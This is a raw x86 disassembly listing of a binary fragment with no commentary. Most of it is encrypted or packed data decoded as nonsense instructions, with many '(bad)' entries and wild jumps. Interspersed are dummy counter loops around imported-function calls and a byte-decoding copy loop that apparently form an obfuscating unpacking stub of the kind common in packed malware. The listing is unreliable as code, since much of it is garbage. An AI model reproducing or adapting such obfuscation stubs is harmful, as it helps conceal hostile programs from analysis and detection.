  40f2c0:	pop    ss
  40f2c1:	sar    bl,1
  40f2c3:	mov    edx,0x27a8d100
  40f2c8:	and    al,0x27
  40f2ca:	inc    edx
  40f2cb:	jp     0x40f2df
  40f2cd:	test   al,0x1
  40f2cf:	pop    esi
  40f2d0:	dec    ebx
  40f2d1:	mov    ecx,0xb1957abd
  40f2d6:	push   ecx
  40f2d7:	test   DWORD PTR [ecx+0x2fe458f5],ebp
  40f2dd:	or     esi,DWORD PTR [esi+0x2d]
  40f2e0:	inc    ecx
  40f2e1:	cwde   
  40f2e2:	lock fist WORD PTR [edx-0x25]
  40f2e6:	dec    eax
  40f2e7:	pop    eax
  40f2e8:	stc    
  40f2e9:	jmp    0x76c8fe3b
  40f2ee:	loopne 0x40f361
  40f2f0:	sub    eax,0x60322d40
  40f2f5:	pop    edx
  40f2f6:	lods   al,BYTE PTR ds:[esi]
  40f2f7:	adc    DWORD PTR [ebp+0x56],0xe4965831
  40f2fe:	xor    eax,0xd3091f8
  40f303:	test   BYTE PTR [eax+0x68],cl
  40f306:	push   ss
  40f307:	or     al,0xf4
  40f309:	xchg   BYTE PTR [ebp+0x14f72525],bl
  40f30f:	mov    ecx,0xdcc672a8
  40f314:	dec    ebx
  40f315:	sbb    esi,DWORD PTR [ecx+0x1e]
  40f318:	xchg   DWORD PTR [esi],esi
  40f31a:	loopne 0x40f366
  40f31c:	and    BYTE PTR [ebx-0x67cd5322],0x31
  40f323:	or     eax,0xfdfb8b3f
  40f328:	fist   DWORD PTR [eax+0x76]
  40f32b:	sbb    al,0xe1
  40f32d:	cdq    
  40f32e:	adc    esp,DWORD PTR [esi]
  40f330:	sbb    eax,0x7d6bfb98
  40f335:	adc    al,0x23
  40f337:	fwait
  40f338:	add    edx,0x9a181a37
  40f33e:	loop   0x40f3bf
  40f340:	jge    0x40f33f
  40f342:	gs out dx,eax
  40f344:	cmp    eax,DWORD PTR ds:0xd7c7ca05
  40f34a:	in     al,0x1d
  40f34c:	test   DWORD PTR [ecx-0x6b],edi
  40f34f:	ins    BYTE PTR es:[edi],dx
  40f350:	and    bl,ch
  40f352:	(bad)  
  40f353:	fmul   DWORD PTR [edi]
  40f355:	ficom  DWORD PTR [ebp+0x5]
  40f358:	push   ecx
  40f359:	jge    0x40f383
  40f35b:	cmp    BYTE PTR [ebx+0x32],bh
  40f35e:	mov    DWORD PTR [ebx+0x3],ecx
  40f361:	jno    0x40f2fd
  40f363:	inc    edx
  40f364:	adc    DWORD PTR [ecx-0x5f56f9af],0xffffff92
  40f36b:	mov    ecx,0x184a8a2d
  40f370:	outs   dx,BYTE PTR ds:[esi]
  40f371:	inc    ebx
  40f372:	nop
  40f373:	pusha  
  40f374:	jp     0x40f3e3
  40f376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f377:	and    ebp,DWORD PTR [edi+0x16916c97]
  40f37d:	stos   DWORD PTR es:[edi],eax
  40f37e:	imul   esi,DWORD PTR [edi+0x33],0x8531b855
  40f385:	pushf  
  40f386:	clc    
  40f387:	and    DWORD PTR ds:0x4337a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4337a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4337a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4337a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4337a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4337a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4337a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4336ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433783
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4336d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4336d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4336d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4336d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4336d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43376f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43376f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43376f,ecx
  40f444:	cmp    DWORD PTR ds:0x43376f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43376f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43376f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43376f,ecx
  40f474:	cmp    DWORD PTR ds:0x43376f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43375b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43375b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43375b,edx
  40f498:	cmp    DWORD PTR ds:0x43375b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433911
  40f4af:	push   0x433967
  40f4b4:	push   0x43394b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43375b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433797
  40f4d2:	adc    DWORD PTR ds:0x4337a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x68c01339]
  40f540:	add    esp,edx
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	rol    esi,0x21
  40f54c:	call   0x65d5dbdf
  40f551:	ja     0x40f502
  40f553:	outs   dx,BYTE PTR ds:[esi]
  40f554:	sub    edi,DWORD PTR ds:[esi]
  40f557:	loopne 0x40f59c
  40f559:	mov    ebp,0xe5504930
  40f55e:	iret   
  40f55f:	ficomp DWORD PTR [edx+0x59f8514e]
  40f565:	or     dh,BYTE PTR [esi]
  40f567:	push   cs
  40f568:	inc    ecx
  40f569:	and    edx,edx
  40f56b:	jnp    0x40f5c7
  40f56d:	rcl    ebp,1
  40f56f:	push   edx
  40f570:	bound  edx,QWORD PTR [eax-0x703a538d]
  40f576:	loope  0x40f562
  40f578:	inc    ebx
  40f579:	xor    edx,esi
  40f57b:	sub    eax,0x9405ac8b
  40f580:	push   0xe4a2dbe3
  40f585:	dec    edi
  40f586:	leave  
  40f587:	int    0xbd
  40f589:	retf   
  40f58a:	inc    esi
  40f58b:	cmp    ebx,0xd39d6d41
  40f591:	sub    al,0xd
  40f593:	jg     0x40f56c
  40f595:	dec    dl
  40f597:	jno    0x40f598
  40f599:	(bad)  
  40f59a:	arpl   WORD PTR [eax+ecx*4+0x70],di
  40f59e:	pop    ds
  40f59f:	(bad)  
  40f5a0:	sub    al,0x63
  40f5a2:	cwde   
  40f5a3:	repz or eax,0xe0c7cc14
  40f5a9:	xchg   ecx,eax
  40f5aa:	lahf   
  40f5ab:	popa   
  40f5ac:	jmp    0x40f5cf
  40f5ae:	out    dx,al
  40f5af:	mov    ch,0x87
  40f5b1:	push   0x8439bfbc
  40f5b6:	xchg   ecx,eax
  40f5b7:	jle    0x40f58f
  40f5b9:	mov    DWORD PTR ds:0xf5b24275,esi
  40f5bf:	outs   dx,BYTE PTR ds:[esi]
  40f5c0:	retf   0xaa05
  40f5c3:	push   esp
  40f5c4:	adc    DWORD PTR [eax+0x7768155b],ebp
  40f5ca:	aam    0x48
  40f5cc:	mov    eax,ds:0xd91792d4
  40f5d1:	mov    eax,ds:0x35c35115
  40f5d6:	rol    BYTE PTR [ebx-0x9],1
  40f5d9:	int3   
  40f5da:	shl    BYTE PTR [ebp-0x5095c8c5],1
  40f5e0:	pop    ebx
  40f5e1:	or     DWORD PTR cs:[ebx-0x324ea418],0xca49e0cc
  40f5ec:	fsub   DWORD PTR [ebx-0x35576073]
  40f5f2:	push   0xffffffeb
  40f5f4:	sbb    ebp,esi
  40f5f6:	aaa    
  40f5f7:	js     0x40f5eb
  40f5f9:	rcl    bh,0xaf
  40f5fc:	sbb    DWORD PTR [ebp+0x7f5a0631],ebp
  40f602:	xchg   ebp,eax
  40f603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f604:	sub    eax,0xb66aa40
  40f609:	adc    al,0xf5
  40f60b:	add    eax,0x7ce69c58
  40f610:	inc    edx
  40f611:	out    dx,eax
  40f612:	fucomp st(6)
  40f614:	ss jmp 0x5656:0x20e11738
  40f61c:	pop    es
  40f61d:	inc    dl
  40f61f:	test   BYTE PTR [eax+edi*2-0x44da8a5],ch
  40f626:	adc    cl,dh
  40f628:	xchg   DWORD PTR [ebx-0x1a],ebp
  40f62b:	or     bh,BYTE PTR [ebx+edx*8]
  40f62e:	jb     0x40f5ea
  40f630:	or     BYTE PTR [edi-0x42],bh
  40f633:	enter  0x68b5,0xf4
  40f637:	push   0x737f4d07
  40f63c:	fcom   DWORD PTR [ebp-0x1c]
  40f63f:	pop    edx
  40f640:	cs shl edi,1
  40f643:	xor    al,0x5
  40f645:	dec    ebp
  40f646:	sub    al,0x10
  40f648:	inc    esi
  40f649:	or     DWORD PTR [ebp-0x1a],0xd4845883
  40f650:	push   ss
  40f651:	test   ecx,esi
  40f653:	shr    BYTE PTR [ebp+eiz*1+0x22],1
  40f657:	adc    eax,0xc05eae83
  40f65c:	(bad)  
  40f65d:	push   ebp
  40f65e:	add    BYTE PTR [ebx-0x10fecde1],bh
  40f664:	comiss xmm7,xmm3
  40f667:	xchg   dl,cl
  40f669:	xchg   BYTE PTR [esi+0x20],al
  40f66c:	retf   
  40f66d:	int3   
  40f66e:	aam    0x46
  40f670:	cdq    
  40f671:	fst    QWORD PTR [eax-0x22]
  40f674:	into   
  40f675:	fistp  WORD PTR ds:0x3c55169e
  40f67b:	push   ecx
  40f67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f67d:	mov    esp,0x6cb75ffe
  40f682:	mov    dh,0x24
  40f684:	jbe    0x40f6ad
  40f686:	fstp   TBYTE PTR [edi-0xc]
  40f689:	(bad)  [edx-0x7b]
  40f68c:	push   ebx
  40f68d:	mov    ebx,0x6cf909c9
  40f692:	sub    ebx,DWORD PTR [esi+0x58]
  40f695:	into   
  40f696:	cmp    DWORD PTR [ecx+0x6c],edi
  40f699:	mov    cl,BYTE PTR [esi]
  40f69b:	jno    0x40f6be
  40f69d:	xor    eax,0xecab3709
  40f6a2:	inc    ecx
  40f6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a4:	(bad)  
  40f6a5:	out    dx,eax
  40f6a6:	ds ins BYTE PTR es:[edi],dx
  40f6a8:	stos   DWORD PTR es:[edi],eax
  40f6a9:	mov    ecx,DWORD PTR [edi+esi*2]
  40f6ac:	xchg   BYTE PTR [ecx],dl
  40f6ae:	and    eax,0x6f492bc5
  40f6b3:	push   0x5d947588
  40f6b8:	push   eax
  40f6b9:	push   edi
  40f6ba:	adc    esp,ebx
  40f6bc:	inc    edx
  40f6bd:	xor    DWORD PTR [esp+esi*4],0x92440893
  40f6c4:	push   edi
  40f6c5:	add    ch,BYTE PTR [esi+0x78b7c599]
  40f6cb:	and    BYTE PTR [ecx],bl
  40f6cd:	cli    
  40f6ce:	mov    DWORD PTR [ebx-0x4c],eax
  40f6d1:	inc    ecx
  40f6d2:	ret    0x539d
  40f6d5:	dec    edi
  40f6d6:	jle    0x40f6a3
  40f6d8:	cmp    esp,DWORD PTR [eax-0x16]
  40f6db:	push   0x1d627376
  40f6e0:	bound  ebx,QWORD PTR [edx-0x3ffa8348]
  40f6e6:	add    bl,ch
  40f6e8:	push   esi
  40f6e9:	in     al,0x38
  40f6eb:	or     eax,0xfb78a2a3
  40f6f0:	ins    BYTE PTR es:[edi],dx
  40f6f1:	xchg   edx,eax
  40f6f2:	xor    al,0x81
  40f6f4:	mov    eax,ds:0x2e062d8f
  40f6f9:	push   0xfd5e6693
  40f6fe:	xor    eax,0x640c66e8
  40f703:	sahf   
  40f704:	xor    BYTE PTR [ecx-0x75],al
  40f707:	aaa    
  40f708:	and    BYTE PTR [ecx+edx*1-0x38],ah
  40f70c:	jne    0x40f6a2
  40f70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70f:	ja     0x40f74f
  40f711:	jbe    0x40f6d5
  40f713:	xchg   ebp,eax
  40f714:	add    DWORD PTR [eax+0x7a7b5173],eax
  40f71a:	mov    al,ds:0xf3179cae
  40f71f:	in     al,dx
  40f720:	mov    ah,0x5c
  40f722:	inc    ecx
  40f723:	in     eax,0x68
  40f725:	ins    DWORD PTR es:[edi],dx
  40f726:	xchg   esp,eax
  40f727:	call   0x344d:0x4b19d6e7
  40f72e:	add    al,0xce
  40f730:	cwde   
  40f731:	sbb    eax,0x1aae3c13
  40f736:	mov    ebp,0x126bd7c5
  40f73b:	fistp  DWORD PTR [ecx+ebp*4+0x16]
  40f73f:	in     al,dx
  40f740:	pop    ss
  40f741:	jg     0x40f6e3
  40f743:	je     0x40f76c
  40f745:	stc    
  40f746:	aaa    
  40f747:	xchg   ecx,eax
  40f748:	sbb    cl,BYTE PTR [ebx]
  40f74a:	jo     0x40f7c6
  40f74c:	or     eax,0x41d0392f
  40f751:	adc    eax,0x3fd7461d
  40f756:	daa    
  40f757:	jle    0x40f763
  40f759:	xchg   edi,eax
  40f75a:	adc    edx,DWORD PTR [edi-0x773903a8]
  40f760:	jg     0x40f7ad
  40f762:	stos   BYTE PTR es:[edi],al
  40f763:	or     BYTE PTR [edi],dl
  40f765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f766:	push   edi
  40f768:	fistp  WORD PTR [eax]
  40f76a:	jl     0x40f747
  40f76c:	mov    dl,BYTE PTR [ebp+0x2d450540]
  40f772:	ret    0xa759
  40f775:	xor    ah,BYTE PTR ds:0x455798c5
  40f77b:	xor    DWORD PTR ds:0x8216977,edx
  40f781:	push   ebx
  40f782:	and    eax,0x9c202525
  40f787:	jge    0x40f7b9
  40f789:	adc    DWORD PTR [ebx-0xa],0x3
  40f78d:	not    DWORD PTR [ecx-0x4de90703]
  40f793:	gs push esi
  40f795:	adc    BYTE PTR [bx+0x6165],dl
  40f79a:	cdq    
  40f79b:	inc    eax
  40f79c:	into   
  40f79d:	out    0xd1,eax
  40f79f:	add    dh,BYTE PTR [ecx-0x1f]
  40f7a2:	jmp    0x7ee197f2
  40f7a7:	cmp    DWORD PTR [ebx],esp
  40f7a9:	pop    esi
  40f7aa:	jae    0x40f7ec
  40f7ac:	pop    edx
  40f7ad:	push   esi
  40f7ae:	stos   BYTE PTR es:[edi],al
  40f7af:	xchg   BYTE PTR [ecx-0x5a304659],ah
  40f7b5:	aam    0xab
  40f7b7:	fs jnp 0x40f834
  40f7ba:	jge    0x40f78d
  40f7bc:	dec    esi
  40f7bd:	fld    DWORD PTR [esi]
  40f7bf:	add    edi,DWORD PTR [ecx]
  40f7c1:	pop    eax
  40f7c2:	hlt    
  40f7c3:	adc    al,0x4d
  40f7c5:	enter  0x4a5b,0xe7
  40f7c9:	jp     0x40f753
  40f7cb:	clc    
  40f7cc:	test   DWORD PTR [edi],esi
  40f7ce:	call   0xd034:0x2ed29f2a
  40f7d5:	cdq    
  40f7d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d7:	ror    DWORD PTR [ecx],cl
  40f7d9:	inc    ebp
  40f7da:	add    eax,0x3e130bef
  40f7df:	adc    eax,DWORD PTR [eax+esi*8+0x57220c98]
  40f7e6:	push   es
  40f7e7:	sub    dh,cl
  40f7e9:	lods   al,BYTE PTR ds:[esi]
  40f7ea:	and    al,0x2
  40f7ec:	repnz pop esi
  40f7ee:	sti    
  40f7ef:	inc    edx
  40f7f0:	pusha  
  40f7f1:	add    eax,0xd145051c
  40f7f6:	loopne 0x40f7eb
  40f7f8:	mov    edx,0x8012ceb4
  40f7fd:	and    esp,DWORD PTR [ebx-0x18fc10b0]
  40f803:	cs nop
  40f805:	int3   
  40f806:	push   ebx
  40f807:	mov    ebx,0xd2605951
  40f80c:	xchg   esi,eax
  40f80d:	scas   eax,DWORD PTR es:[edi]
  40f80e:	pushf  
  40f80f:	ds sbb al,0x6c
  40f812:	sbb    DWORD PTR [ebp+0x204f2648],esp
  40f818:	sbb    al,0x64
  40f81a:	mov    al,0x44
  40f81c:	and    BYTE PTR [ebx-0x4],ch
  40f81f:	pop    ecx
  40f820:	mov    cl,BYTE PTR es:[ebp-0x7ccf3358]
  40f827:	cwde   
  40f828:	adc    cl,BYTE PTR [eax-0x49d470f7]
  40f82e:	push   esi
  40f82f:	fwait
  40f830:	pop    esp
  40f831:	pop    es
  40f832:	and    bl,BYTE PTR [ecx+0x12f9660f]
  40f838:	data16 mov ah,0xa6
  40f83b:	sbb    dh,BYTE PTR [ebp+0x43]
  40f83e:	in     eax,dx
  40f83f:	mov    bl,0x9
  40f841:	adc    cl,BYTE PTR [ecx]
  40f843:	push   esi
  40f844:	and    DWORD PTR [eax-0x75],esp
  40f847:	pop    es
  40f848:	xlat   BYTE PTR ds:[ebx]
  40f849:	lods   al,BYTE PTR ds:[esi]
  40f84a:	jo     0x40f87f
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xd4f4783f
  40f897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	es or  eax,0x26eea6f5
  40f8a6:	inc    DWORD PTR [ecx]
  40f8a8:	(bad)  
  40f8a9:	jmp    FWORD PTR [esi-0x2]
  40f8ac:	or     eax,0x7c6008b8
  40f8b1:	pop    ecx
  40f8b2:	push   es
  40f8b3:	jno    0x40f8fd
  40f8b5:	icebp  
  40f8b6:	push   eax
  40f8b7:	loopne 0x40f897
  40f8b9:	test   al,0xc4
  40f8bb:	xchg   bl,al
  40f8bd:	les    ebx,FWORD PTR [ebx]
  40f8bf:	cmp    eax,0x4b36235
  40f8c4:	call   0x5ce92f5e
  40f8c9:	repz mov dl,0x20
  40f8cc:	xor    eax,0xdb19721c
  40f8d1:	mov    eax,ds:0xd91258e7
  40f8d6:	add    BYTE PTR [esi+0x2052576],ah
  40f8dc:	retf   
  40f8dd:	scas   eax,DWORD PTR es:[edi]
  40f8de:	and    esi,DWORD PTR [ecx+0x47]
  40f8e1:	aad    0x67
  40f8e3:	arpl   WORD PTR [ecx+ecx*2],sp
  40f8e6:	xor    BYTE PTR [ebp+edx*1-0x4a],bh
  40f8ea:	pop    esi
  40f8eb:	push   ebp
  40f8ec:	push   ebp
  40f8ed:	mov    ds:0xe26a626a,eax
  40f8f2:	add    DWORD PTR [ecx],ebp
  40f8f4:	(bad)  
  40f8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8f6:	mov    esp,0xd3cc4b38
  40f8fb:	sbb    eax,0x2b51aab1
  40f900:	(bad)  
  40f901:	int    0xfc
  40f903:	and    ebx,edi
  40f905:	xchg   esp,eax
  40f906:	xchg   esp,eax
  40f907:	cmp    BYTE PTR [edx+ecx*8-0x31],ch
  40f90b:	jge    0x40f979
  40f90d:	add    edx,DWORD PTR [esi+ecx*1+0x57adfc41]
  40f914:	icebp  
  40f915:	addr16 dec esi
  40f917:	cmp    ebx,DWORD PTR [ecx+0x3a737054]
  40f91d:	sbb    eax,0x57e7a58c
  40f922:	stos   BYTE PTR es:[edi],al
  40f923:	add    bl,BYTE PTR [esi-0x4aa3c810]
  40f929:	test   ch,dh
  40f92b:	and    ah,0x23
  40f92e:	jecxz  0x40f907
  40f930:	daa    
  40f931:	pop    esi
  40f932:	add    al,0x99
  40f934:	or     esi,DWORD PTR [ebp-0x3d941829]
  40f93a:	sub    ch,bl
  40f93c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f93d:	xchg   DWORD PTR [edi+edi*8-0x7d],eax
  40f941:	mov    ebx,0xb71e1c25
  40f946:	aaa    
  40f947:	lock add eax,DWORD PTR [eax]
  40f94a:	add    BYTE PTR [eax-0x34],ah
  40f94d:	div    dh
  40f94f:	sub    bl,BYTE PTR [ebx]
  40f951:	push   esp
  40f953:	jno    0x40f8f7
  40f955:	sbb    eax,ecx
  40f957:	out    0x4a,al
  40f959:	enter  0x65f4,0x6
  40f95d:	mov    ds:0xc45983b5,eax
  40f962:	aad    0x2b
  40f964:	mov    al,ds:0x5d0270bc
  40f969:	jl     0x40f918
  40f96b:	lahf   
  40f96c:	inc    ebp
  40f96d:	mov    dl,0x7f
  40f96f:	mov    bl,cl
  40f971:	mov    esp,0x49a825bf
  40f976:	pop    ebp
  40f977:	outs   dx,BYTE PTR ds:[esi]
  40f978:	push   ss
  40f979:	mov    ah,0xfb
  40f97b:	call   0x87ae:0x359269ce
  40f982:	test   al,0x1a
  40f984:	or     al,0x8d
  40f986:	jmp    0xeb721190
  40f98b:	retf   
  40f98c:	aad    0x13
  40f98e:	(bad)  
  40f98f:	fst    st(7)
  40f991:	jmp    0xfd5d:0x65ba1f4f
  40f998:	retf   0x3b92
  40f99b:	lock js 0x40f98b
  40f99e:	jmp    0x40f9d5
  40f9a0:	retf   
  40f9a1:	scas   al,BYTE PTR es:[edi]
  40f9a2:	shl    BYTE PTR [edi],cl
  40f9a4:	push   ss
  40f9a5:	fcomip st,st(3)
  40f9a7:	test   al,0x7d
  40f9a9:	and    esi,DWORD PTR [eax+0x67]
  40f9ac:	sbb    ecx,DWORD PTR [ecx+0xe0ac28e]
  40f9b2:	fdiv   DWORD PTR [eax+eiz*2+0x6d]
  40f9b6:	das    
  40f9b7:	xchg   ebp,esi
  40f9b9:	dec    eax
  40f9ba:	inc    ebp
  40f9bb:	hlt    
  40f9bc:	lock repnz and bp,WORD PTR [eax+0x64eb4d57]
  40f9c5:	or     ebx,DWORD PTR [edx]
  40f9c7:	xchg   esi,eax
  40f9c8:	aam    0x6e
  40f9ca:	loope  0x40f987
  40f9cc:	xor    DWORD PTR [edi],ebx
  40f9ce:	adc    DWORD PTR [edi],0x7da429ea
  40f9d4:	fbld   TBYTE PTR [ebx]
  40f9d6:	stos   BYTE PTR es:[edi],al
  40f9d7:	add    ebx,DWORD PTR ds:0x660a20b9
  40f9dd:	dec    ebx
  40f9de:	scas   eax,DWORD PTR es:[edi]
  40f9df:	inc    ebp
  40f9e0:	pop    ebx
  40f9e1:	cmp    al,0x70
  40f9e3:	inc    ecx
  40f9e4:	es ret 0x295d
  40f9e8:	mov    bl,0xba
  40f9ea:	lods   al,BYTE PTR ds:[esi]
  40f9eb:	test   al,0xbb
  40f9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ee:	adc    ebp,esp
  40f9f0:	add    al,0xcc
  40f9f2:	cld    
  40f9f3:	in     eax,dx
  40f9f4:	ror    BYTE PTR [eax],1
  40f9f6:	xchg   edx,eax
  40f9f7:	and    cl,BYTE PTR [ebx+0x1e]
  40f9fa:	cmp    eax,0x57dc5348
  40f9ff:	mov    ah,BYTE PTR fs:[edx]
  40fa02:	jo     0x40f995
  40fa04:	arpl   WORD PTR [edi-0x723b8703],ax
  40fa0a:	addr16 adc eax,esp
  40fa0d:	lock cwde 
  40fa0f:	in     eax,0xea
  40fa11:	mov    al,0x50
  40fa13:	pushf  
  40fa14:	lahf   
  40fa15:	mov    edx,0x60619769
  40fa1a:	mov    WORD PTR [edi-0x4a4b034a],cs
  40fa20:	xchg   ecx,eax
  40fa21:	loope  0x40fa83
  40fa23:	call   0x8346:0xff391425
  40fa2a:	sub    edx,DWORD PTR ds:0xa377fc98
  40fa30:	data16 sar bl,0x1b
  40fa34:	lock jb 0x40fa67
  40fa37:	fisubr WORD PTR [edx+0x399817c0]
  40fa3d:	(bad)  
  40fa3e:	fmul   st(6),st
  40fa40:	and    DWORD PTR [esi],eax
  40fa42:	repz push es
  40fa44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa45:	jae    0x40fa0a
  40fa47:	bound  esp,QWORD PTR [edx+esi*4+0x14]
  40fa4b:	rol    DWORD PTR [edi+0x72018a88],1
  40fa51:	mov    bh,0x8c
  40fa53:	inc    esp
  40fa54:	jmp    0x40fa1f
  40fa56:	and    eax,0x856fa2a3
  40fa5b:	mov    ch,0x7e
  40fa5d:	jle    0x40fa9f
  40fa5f:	jnp    0x40f9f2
  40fa61:	retf   0xa20
  40fa64:	repz mov cl,0x5c
  40fa67:	std    
  40fa68:	leave  
  40fa69:	mov    esp,0x6a478570
  40fa6e:	das    
  40fa6f:	or     al,0x2e
  40fa71:	and    eax,0x1edf7cf3
  40fa76:	dec    ebp
  40fa77:	jp     0x40fa0b
  40fa79:	jmp    0x751f50d1
  40fa7e:	xor    ch,BYTE PTR [ecx-0x63]
  40fa81:	cdq    
  40fa82:	inc    ecx
  40fa83:	arpl   WORD PTR [ecx-0x70],bx
  40fa86:	dec    ebx
  40fa87:	lock fcmovne st,st(0)
  40fa8a:	mov    esp,0x1c04312c
  40fa8f:	or     DWORD PTR [esi-0x69],ecx
  40fa92:	mov    ?,WORD PTR [eax+0x5ac8a607]
  40fa98:	aas    
  40fa99:	cmp    ebp,DWORD PTR [eax-0x333c9558]
  40fa9f:	mov    edx,0x1167c649
  40faa4:	mov    cl,0xf2
  40faa6:	fld    TBYTE PTR [edi+0x79]
  40faa9:	cmp    DWORD PTR [edx+0xf922d7c],eax
  40faaf:	or     al,ah
  40fab1:	pop    edx
  40fab2:	scas   eax,DWORD PTR es:[edi]
  40fab3:	add    eax,0xaceafa31
  40fab8:	mov    al,0x84
  40faba:	add    al,0x6c
  40fabc:	mov    edi,DWORD PTR [edi+0x30450408]
  40fac2:	bound  esi,QWORD PTR [edi]
  40fac4:	push   ebx
  40fac5:	jl     0x40fb38
  40fac7:	jge    0x40fb20
  40fac9:	imul   ecx,DWORD PTR [ebp-0x2c],0xffffffe7
  40facd:	mov    edi,0x6ad91004
  40fad2:	or     dl,BYTE PTR [edx+0x19]
  40fad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad7:	sub    BYTE PTR [ebx+0x5f402a4f],ch
  40fadd:	mov    cl,0x22
  40fadf:	cmp    esp,DWORD PTR [ebx+0x5f]
  40fae2:	(bad)  
  40fae3:	dec    ebx
  40fae4:	cmp    bl,dh
  40fae6:	push   ebx
  40fae7:	cli    
  40fae8:	lahf   
  40fae9:	sahf   
  40faea:	repz xchg edi,eax
  40faec:	cmp    BYTE PTR ds:0x50ce2f9,bh
  40faf2:	add    al,0xe1
  40faf4:	shl    ecx,1
  40faf6:	mov    eax,0xac89c0e0
  40fafb:	out    0xf8,eax
  40fafd:	in     eax,0x6
  40faff:	push   ecx
  40fb00:	sahf   
